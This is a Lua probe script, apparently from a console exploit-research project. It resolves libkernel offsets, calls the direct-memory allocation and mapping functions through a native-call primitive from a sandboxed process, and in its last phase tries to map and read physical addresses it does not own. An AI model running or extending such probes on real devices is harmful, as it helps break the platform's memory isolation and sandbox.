-- CRASH_CLASS: MODERATE
-- PROBE 1522b: sceKernelMapDirectMemory via native.fcall_with_rax (6 register args, no SROP)
--
-- -- prior art:
--   probes/phase27_phys_memory/528f_mainthread_mapdm.lua
--     results/phase27_phys_memory/528f_mainthread_mapdm_20261025_093141.txt
--     -> libkernel+0x17EF0 = sceKernelAllocateDirectMemory called with
--        native.fcall_with_rax(fn, 0, 0, 0x150000000, 0x4000, 0x4000, 0, &phys)
--        returned rv=0 phys=0x110010000. libkernel+0x15020 = sceKernelMapDirectMemory
--        was then called through a 7-arg main-thread SROP and the process died at
--        "[B] [1] flags=0x0" -- no return value was ever observed.
--   probes/phase27_phys_memory/528h_mapdm_debug.lua
--     results/.../528h_mapdm_debug_20261025_093940.txt -- GetDirectMemorySize via SROP
--     = 0x50000000; MapDirectMemory via SROP died again.
--   .local/loader_payload/gpu.lua:344 alloc_main_dmem -- the payload's own call shape is
--     sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size): SIX arguments,
--     all in registers (rdi,rsi,rdx,rcx,r8,r9). No stack argument => no SROP is needed.
--     That is the delta this probe tests.
--   probes/phase36_realargs/1522a_mapdm_fcall_sixarg.lua
--     results/.../1522a_mapdm_fcall_sixarg_20261109_233942.txt -- dlsym is unusable for a
--     game process: getuid()=1 and is_in_sandbox()=1, so misc.lua:470 check_jailbroken()
--     raises, and the raw syscall 0x24f returns -1 for every symbol. Symbol resolution is
--     therefore not available and the hardcoded module offsets above are the only path.
--   docs/DEAD_ENDS.md MapDM bullet.
--
-- Why: every MapDirectMemory attempt in this tree went through a hand-built signal frame or a
-- child ROP chain and died before returning. Six register arguments from the main thread is
-- exactly the payload's own shape. If it returns 0 this is the first measured MapDirectMemory
-- on 14.10 and phase [F] asks the exploit question: does it map a physical address we do not
-- own? Phase [F] READS ONLY -- no store is ever made outside a mapping we allocated ourselves.

print("=== PROBE 1522b: MAPDIRECTMEMORY VIA 6-ARG FCALL ===")
print("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function addr_of(u)
    local n = N(u)
    if n >= 0x10000 and n < 0x8000000000 then return n end
    return nil
end
local function U(v) return uint64(v) end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return N(v) end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function wd(a, v)
    local ok = pcall(function() memory.write_dword(a, uint64(v)) end)
    return ok
end
local function fmt(v)
    if v == nil then return "nil" end
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return string.format("0x%X", n)
end
local function sid(v)
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return n
end

local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end
local PID0 = self_pid()
print("pid=" .. tostring(PID0))

local function call6(fn, rdi, rsi, rdx, rcx, r8, r9)
    local ok, rv = pcall(function()
        return native.fcall_with_rax(U(fn), U(0), U(rdi), U(rsi), U(rdx), U(rcx), U(r8), U(r9))
    end)
    if not ok then return nil end
    return N(rv)
end

-- ============================================================
-- [A] libkernel text base through dynlib_get_info(593)
-- ============================================================
print("[A] libkernel base")

local function base_of(handle)
    local ib = memory.alloc(0x200)
    local iba = addr_of(ib)
    if not iba then return nil end
    wd(iba, 0x160)
    local ok, rv = pcall(function() return mk(593)(uint64(handle), uint64(iba)) end)
    if not ok or N(rv) ~= 0 then return nil end
    local lo = rd(iba + 0x108) or 0
    local hi = rd(iba + 0x10C) or 0
    lo = lo % 4294967296
    hi = hi % 4294967296
    if lo == 0 and hi == 0 then return nil end
    return hi * 4294967296 + lo
end

local lk = base_of(0x2001)
if not lk then
    for h = 0, 0x120 do
        local ib = memory.alloc(0x200)
        local iba = addr_of(ib)
        if iba then
            wd(iba, 0x160)
            local ok, rv = pcall(function() return mk(593)(uint64(h), uint64(iba)) end)
            if ok and N(rv) == 0 then
                local name = ""
                for i = 0, 31 do
                    local b = rd(iba + 8 + i)
                    if b and b % 256 ~= 0 then
                        local c = b % 256
                        if c >= 32 and c < 127 then name = name .. string.char(c) end
                    elseif b then break end
                end
                if name:find("libkernel") then
                    local lo = (rd(iba + 0x108) or 0) % 4294967296
                    local hi = (rd(iba + 0x10C) or 0) % 4294967296
                    if lo ~= 0 or hi ~= 0 then lk = hi * 4294967296 + lo end
                    break
                end
            end
        end
    end
end

if not lk then
    print("  FAIL: no libkernel base")
    print("VERDICT: cannot proceed.")
    return
end
print("  libkernel text = " .. fmt(lk))

-- libkernel text is PROT_EXEC-only (a read past pcall kills the process), so the
-- prologue bytes are deliberately NOT dumped. Offsets are module-relative and stable.
local alloc_fn = lk + 0x17EF0
local map_fn   = lk + 0x15020
print("  AllocateDirectMemory = " .. fmt(alloc_fn) .. "  (libkernel+0x17EF0)")
print("  MapDirectMemory      = " .. fmt(map_fn)   .. "  (libkernel+0x15020)")

-- ============================================================
-- [B] map_fn identity check: a zero length must be refused, not crash
-- ============================================================
print("")
print("[B] map_fn identity probe (len = 0 must be refused, not crash)")
local vo0 = memory.alloc(8)
local vo0a = addr_of(vo0)
if not vo0a then print("  FAIL: no out buffer"); return end
memory.write_qword(vo0, uint64(0))
local rvB = call6(map_fn, vo0a, 0, 3, 0, 0, 0)
if rvB == nil then
    print("  fcall did not return -- map_fn is not a callable mapping function")
    print("VERDICT: libkernel+0x15020 is not MapDirectMemory on this image.")
    return
end
print("  rv=" .. tostring(rvB) .. " (0x" .. string.format("%X", sid(rvB)) .. ") out=" .. fmt(rq(vo0a)))
if rvB == 0 then
    print("  NOTE: len 0 returned success; continuing anyway")
end

-- ============================================================
-- [C] allocate a direct-memory block (the shape 528f proved works)
-- ============================================================
print("")
print("[C] AllocateDirectMemory(0, 0x150000000, 0x4000, 0x4000, 0, &phys)")
local pout = memory.alloc(8)
local pouta = addr_of(pout)
if not pouta then print("  FAIL: no out buffer"); return end
memory.write_qword(pout, uint64(0))
local rvC = call6(alloc_fn, U(0), U(0x150000000), U(0x4000), U(0x4000), U(0), U(pouta))
if rvC == nil then
    print("  fcall did not return -- AllocateDirectMemory failed to call")
    print("VERDICT: no owned block; cannot continue to the map.")
    return
end
local phys = rq(pouta)
print("  rv=" .. tostring(rvC) .. " phys=" .. fmt(phys))
if rvC ~= 0 or not phys or phys < 0x1000 then
    print("  no block; the map test will use phys 0 as its control")
    phys = nil
end

-- ============================================================
-- [D] MapDirectMemory -- SIX register arguments, main thread
-- ============================================================
print("")
print("[D] MapDirectMemory(&va, 0x4000, prot, flags, phys, 0x4000)")

local function try_map(label, physaddr, flags, prot)
    local vo = memory.alloc(8)
    local voaddr = addr_of(vo)
    if not voaddr then print("    ABORT: out pointer"); return nil, nil end
    memory.write_qword(vo, uint64(0))
    print("    " .. label .. ": phys=" .. fmt(physaddr) .. " prot=" .. prot .. " flags=" .. fmt(flags))
    local rv = call6(map_fn, voaddr, 0x4000, prot, flags, physaddr, 0x4000)
    if rv == nil then
        print("      -> fcall did not return (trap or crash)")
        return nil, nil
    end
    local va = rq(voaddr)
    print("      -> rv=" .. tostring(rv) .. " (0x" .. string.format("%X", sid(rv)) .. ") va=" .. fmt(va))
    if rv == 0 and va and va > 0x10000 then return rv, va end
    return rv, nil
end

local va_mapped = nil
if phys then
    local combos = {
        { "f0/p3",  0,    3 },
        { "f0/p1",  0,    1 },
        { "f1000",  0x1000, 3 },
        { "f12",    0x12, 3 },
        { "f412",   0x412, 3 },
    }
    for _, c in ipairs(combos) do
        local rv, va = try_map(c[1], phys, c[2], c[3])
        if va then va_mapped = va break end
        if rv == nil then break end
    end
else
    print("  skipped: no owned physical block")
end

if not va_mapped then
    print("")
    print("VERDICT: MapDirectMemory did not return a mapping on 14.10.")
    print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
    return
end

-- ============================================================
-- [E] is the mapping real memory?
-- ============================================================
print("")
print("[E] mapping at " .. fmt(va_mapped))
local line = "  before: "
for i = 0, 7 do line = line .. string.format("%08X ", rd(va_mapped + i * 4) or 0) end
print(line)
local wrote = wd(va_mapped, 0x52414D32)
local back = rd(va_mapped)
print("  write 0x52414D32 -> readback " .. string.format("%08X", back or 0) ..
      (back == 0x52414D32 and "   (RW CONFIRMED)" or "   (not writable)"))

-- ============================================================
-- [F] does it accept a physical address we do not own?  READ ONLY.
-- ============================================================
print("")
print("[F] MapDirectMemory at physical addresses outside our allocation (READ ONLY)")
local targets = { 0x0, 0x1000, 0x100000, 0x1000000, 0x8000000 }
for i, pa in ipairs(targets) do
    if phys and pa == phys then
        print("  [F" .. i .. "] " .. fmt(pa) .. " skipped (ours)")
    else
        local vo = memory.alloc(8)
        local voaddr = addr_of(vo)
        if not voaddr then print("  [F" .. i .. "] ABORT: out pointer"); break end
        memory.write_qword(vo, uint64(0))
        print("  [F" .. i .. "] phys=" .. fmt(pa))
        local rv = call6(map_fn, voaddr, 0x1000, 1, 0, pa, 0x1000)
        if rv == nil then
            print("      -> fcall did not return (trap or crash)")
            break
        end
        local va = rq(voaddr)
        print("      -> rv=" .. tostring(rv) .. " (0x" .. string.format("%X", sid(rv)) .. ") va=" .. fmt(va))
        if rv == 0 and va and va > 0x10000 then
            local d = {}
            local okall = true
            for k = 0, 3 do
                local v = rd(va + k * 4)
                if not v then okall = false break end
                d[k] = v
            end
            if okall then
                print(string.format("      READS: %08X %08X %08X %08X", d[0], d[1], d[2], d[3]))
                print("      *** PHYSICAL " .. fmt(pa) .. " MAPPED AND READ ***")
            else
                print("      mapped, but the first read faulted")
            end
        end
    end
end

print("")
print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
print("")
print("=== PROBE 1522b COMPLETE ===")
